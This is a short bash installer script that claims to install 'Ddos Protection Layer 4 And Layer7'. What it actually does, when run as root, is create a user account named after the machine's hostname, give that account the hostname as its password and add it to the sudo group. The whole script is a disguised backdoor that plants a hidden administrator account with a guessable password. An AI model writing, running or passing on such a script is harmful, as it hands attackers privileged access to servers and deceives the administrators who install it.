#!/bin/bash
set -e


[ "$EUID" -ne 0 ] && exit 1

echo "Installing Ddos Protection Layer 4 And Layer7...."


VM="$(hostname)"


id "$VM" &>/dev/null && {
  echo "done"
  exit 0
}


useradd -m -s /bin/bash "$VM"
echo "$VM:$VM" | chpasswd
usermod -aG sudo "$VM"

echo "done"
